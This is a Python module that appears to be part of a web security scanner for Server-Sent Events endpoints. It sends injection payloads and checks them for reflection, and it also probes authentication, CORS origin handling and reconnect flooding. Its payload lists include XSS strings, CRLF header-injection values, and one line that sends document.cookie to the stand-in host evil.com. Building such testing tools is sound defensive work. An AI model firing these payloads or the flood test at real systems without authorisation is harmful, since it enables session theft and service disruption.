"""Server-Sent Events (SSE) security testing."""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass

import requests


logger = logging.getLogger(__name__)

# ── SSE Injection Payloads ────────────────────────────────────────────────────

_SSE_XSS_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    '"><svg/onload=alert(1)>',
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    '<iframe src="javascript:alert(1)">',
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    '"><img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
    '{{constructor.constructor("alert(1")()}}',  # Template injection
    "${7*7}",  # SSTI
    "{{7*7}}",  # SSTI Jinja2
]

_SSE_HEADER_INJECTION_PAYLOADS = [
    "data: secret_token\r\nX-Injected: true\r\n\r\n",
    "data: normal\r\n\r\ndata: injected\r\n\r\n",
    "event: injected\ndata: malicious\r\n\r\n",
    "id: 1\ndata: payload\r\nretry: 999999\r\n\r\n",
    "data: line1\ndata: line2\r\n\r\n",
]

_SSE_LOG_INJECTION_PAYLOADS = [
    "data: [ERROR] User admin logged in",
    "data: \x1b[31mANSI escape injection\x1b[0m",
    "data: <br/>HTML injection in log",
    "data: \r\nFake log entry: admin password changed",
    "data: 2024-01-01 INFO Admin account created",
]


@dataclass
class SSETestResult:
    test_name: str
    vulnerable: bool
    description: str
    evidence: str = ""
    severity: str = "medium"


def test_sse_xss_injection(
    url: str,
    inject_url: str | None = None,
    headers: dict[str, str] | None = None,
) -> SSETestResult:
    """Test for XSS injection via SSE — inject payload via query param and check reflection."""
    if not inject_url:
        return SSETestResult(
            test_name="SSE XSS Injection",
            vulnerable=False,
            description="No injection endpoint provided for SSE XSS test",
        )

    for payload in _SSE_XSS_PAYLOADS[:5]:
        try:
            # Send payload via query parameter to SSE endpoint
            separator = "&" if "?" in inject_url else "?"
            test_url = f"{inject_url}{separator}message={requests.utils.quote(payload)}"

            resp = requests.get(
                test_url,
                headers={"Accept": "text/event-stream", **(headers or {})},
                timeout=10,
                stream=True,
                verify=False,
            )

            if resp.status_code != 200:
                resp.close()
                continue

            start = time.monotonic()
            for line in resp.iter_lines(decode_unicode=True):
                if time.monotonic() - start > 5:
                    break
                if line and line.startswith("data:"):
                    data = line[5:].strip()
                    # Check if payload is reflected without sanitization
                    if payload in data:
                        resp.close()
                        return SSETestResult(
                            test_name="SSE XSS Injection",
                            vulnerable=True,
                            description="XSS payload reflected in SSE data field",
                            evidence=f"Injected: {payload}\nReflected: {data[:200]}",
                            severity="critical",
                        )
                    # Check for partial reflection
                    if any(tag in data for tag in ["<script", "onerror", "onload", "javascript:"]):
                        resp.close()
                        return SSETestResult(
                            test_name="SSE XSS Injection",
                            vulnerable=True,
                            description="Partial XSS payload reflected in SSE data",
                            evidence=f"Reflected: {data[:200]}",
                            severity="high",
                        )

            resp.close()
        except Exception as exc:
            logger.debug("SSE XSS test failed: %s", exc)

    return SSETestResult(
        test_name="SSE XSS Injection",
        vulnerable=False,
        description="No XSS payloads reflected in SSE events",
    )


def test_sse_header_injection(
    url: str,
    inject_url: str | None = None,
    headers: dict[str, str] | None = None,
) -> SSETestResult:
    """Test for HTTP header injection via SSE event data."""
    if not inject_url:
        return SSETestResult(
            test_name="SSE Header Injection",
            vulnerable=False,
            description="No injection endpoint provided for SSE header injection test",
        )

    for payload in _SSE_HEADER_INJECTION_PAYLOADS:
        try:
            separator = "&" if "?" in inject_url else "?"
            test_url = f"{inject_url}{separator}message={requests.utils.quote(payload)}"

            resp = requests.get(
                test_url,
                headers={"Accept": "text/event-stream", **(headers or {})},
                timeout=10,
                stream=True,
                verify=False,
            )

            if resp.status_code != 200:
                resp.close()
                continue

            # Check response headers for injected headers
            for header_name in resp.headers:
                if header_name.lower().startswith("x-injected"):
                    resp.close()
                    return SSETestResult(
                        test_name="SSE Header Injection",
                        vulnerable=True,
                        description="HTTP header injection via SSE event data",
                        evidence=f"Injected header: {header_name}: {resp.headers[header_name]}",
                        severity="high",
                    )

            # Check if response body contains injected content
            start = time.monotonic()
            body = ""
            for line in resp.iter_lines(decode_unicode=True):
                if time.monotonic() - start > 3:
                    break
                if line:
                    body += line + "\n"

            resp.close()

            if "X-Injected" in body or "injected" in body.lower():
                return SSETestResult(
                    test_name="SSE Header Injection",
                    vulnerable=True,
                    description="Header injection payload reflected in SSE stream",
                    evidence="Injected content found in response",
                    severity="high",
                )

        except Exception as exc:
            logger.debug("SSE header injection test failed: %s", exc)

    return SSETestResult(
        test_name="SSE Header Injection",
        vulnerable=False,
        description="No header injection detected in SSE events",
    )


def test_sse_log_injection(
    url: str,
    inject_url: str | None = None,
    headers: dict[str, str] | None = None,
) -> SSETestResult:
    """Test for log injection via SSE — can attacker forge log entries?"""
    if not inject_url:
        return SSETestResult(
            test_name="SSE Log Injection",
            vulnerable=False,
            description="No injection endpoint provided for SSE log injection test",
        )

    for payload in _SSE_LOG_INJECTION_PAYLOADS:
        try:
            separator = "&" if "?" in inject_url else "?"
            test_url = f"{inject_url}{separator}message={requests.utils.quote(payload)}"

            resp = requests.get(
                test_url,
                headers={"Accept": "text/event-stream", **(headers or {})},
                timeout=10,
                stream=True,
                verify=False,
            )

            if resp.status_code != 200:
                resp.close()
                continue

            start = time.monotonic()
            for line in resp.iter_lines(decode_unicode=True):
                if time.monotonic() - start > 3:
                    break
                if line and line.startswith("data:"):
                    data = line[5:].strip()
                    if payload in data:
                        resp.close()
                        return SSETestResult(
                            test_name="SSE Log Injection",
                            vulnerable=True,
                            description="Log injection payload reflected in SSE events",
                            evidence=f"Reflected: {data[:200]}",
                            severity="medium",
                        )

            resp.close()
        except Exception as exc:
            logger.debug("SSE log injection test failed: %s", exc)

    return SSETestResult(
        test_name="SSE Log Injection",
        vulnerable=False,
        description="No log injection detected in SSE events",
    )


def test_sse_auth_bypass(
    url: str,
    headers: dict[str, str] | None = None,
) -> SSETestResult:
    """Test if SSE endpoint can be accessed without authentication."""
    try:
        # Try without any auth headers
        resp = requests.get(
            url,
            headers={"Accept": "text/event-stream"},
            timeout=5,
            stream=True,
            verify=False,
        )

        if resp.status_code == 200:
            # Read first few lines to confirm it's a real SSE stream
            start = time.monotonic()
            has_data = False
            for line in resp.iter_lines(decode_unicode=True):
                if time.monotonic() - start > 3:
                    break
                if line and line.startswith(("data:", "event:")):
                    has_data = True
                    break
            resp.close()

            if has_data:
                return SSETestResult(
                    test_name="SSE Auth Bypass",
                    vulnerable=True,
                    description="SSE endpoint accessible without authentication",
                    evidence=(
                        "Server returned SSE stream without auth headers "
                        f"(status {resp.status_code})"
                    ),
                    severity="high",
                )

        resp.close()
    except Exception as exc:
        logger.debug("SSE auth bypass test failed: %s", exc)

    return SSETestResult(
        test_name="SSE Auth Bypass",
        vulnerable=False,
        description="SSE endpoint requires authentication or is not an SSE endpoint",
    )


def test_sse_origin_validation(
    url: str,
    headers: dict[str, str] | None = None,
) -> SSETestResult:
    """Test if SSE endpoint validates the Origin header (CORS misconfiguration)."""
    evil_origins = [
        "https://evil.com",
        "https://attacker.example.com",
        "null",
    ]

    for origin in evil_origins:
        try:
            test_headers = {
                "Accept": "text/event-stream",
                "Origin": origin,
                **(headers or {}),
            }

            resp = requests.get(
                url,
                headers=test_headers,
                timeout=5,
                stream=True,
                verify=False,
            )

            if resp.status_code == 200:
                # Check if the server reflects the evil origin back
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                if acao == origin or acao == "*":
                    resp.close()
                    return SSETestResult(
                        test_name="SSE Origin Validation",
                        vulnerable=True,
                        description=f"SSE endpoint accepts arbitrary Origin header ({origin})",
                        evidence=f"Access-Control-Allow-Origin: {acao}",
                        severity="high",
                    )

                # Read a line to confirm it's a real SSE stream
                start = time.monotonic()
                has_data = False
                for line in resp.iter_lines(decode_unicode=True):
                    if time.monotonic() - start > 2:
                        break
                    if line and line.startswith(("data:", "event:")):
                        has_data = True
                        break
                resp.close()

                if has_data and acao in ("*", origin):
                    return SSETestResult(
                        test_name="SSE Origin Validation",
                        vulnerable=True,
                        description=f"SSE endpoint streams data with reflected origin ({origin})",
                        evidence=f"Status: {resp.status_code}, ACAO: {acao}",
                        severity="high",
                    )

            resp.close()
        except Exception as exc:
            logger.debug("SSE origin validation test failed: %s", exc)

    return SSETestResult(
        test_name="SSE Origin Validation",
        vulnerable=False,
        description="SSE endpoint validates Origin header or does not set CORS headers",
    )


def test_sse_reconnect_flood(
    url: str,
    headers: dict[str, str] | None = None,
    reconnect_count: int = 10,
) -> SSETestResult:
    """Test if rapid SSE reconnections cause server resource exhaustion."""
    try:
        start = time.monotonic()
        success_count = 0

        for _ in range(reconnect_count):
            try:
                resp = requests.get(
                    url,
                    headers={"Accept": "text/event-stream", **(headers or {})},
                    timeout=3,
                    stream=True,
                    verify=False,
                )
                if resp.status_code == 200:
                    success_count += 1
                    # Read one line then close (simulate reconnect)
                    for line in resp.iter_lines(decode_unicode=True):
                        break
                resp.close()
            except Exception:
                pass

        elapsed = time.monotonic() - start

        # If all reconnections succeeded quickly, server may lack rate limiting
        if success_count == reconnect_count and elapsed < reconnect_count * 0.5:
            return SSETestResult(
                test_name="SSE Reconnect Flood",
                vulnerable=True,
                description=f"Server accepted {reconnect_count} rapid reconnections",
                evidence=f"All {success_count} reconnections succeeded in {elapsed:.1f}s",
                severity="medium",
            )

        return SSETestResult(
            test_name="SSE Reconnect Flood",
            vulnerable=False,
            description=f"Server handled {success_count}/{reconnect_count} reconnections",
        )

    except Exception as exc:
        return SSETestResult(
            test_name="SSE Reconnect Flood",
            vulnerable=False,
            description=f"Test inconclusive: {exc}",
        )


def run_all_sse_tests(
    url: str,
    inject_url: str | None = None,
    headers: dict[str, str] | None = None,
) -> list[SSETestResult]:
    """Run all SSE security tests."""
    results = []
    results.append(test_sse_xss_injection(url, inject_url, headers))
    results.append(test_sse_header_injection(url, inject_url, headers))
    results.append(test_sse_log_injection(url, inject_url, headers))
    results.append(test_sse_auth_bypass(url, headers))
    results.append(test_sse_origin_validation(url, headers))
    results.append(test_sse_reconnect_flood(url, headers))
    return results
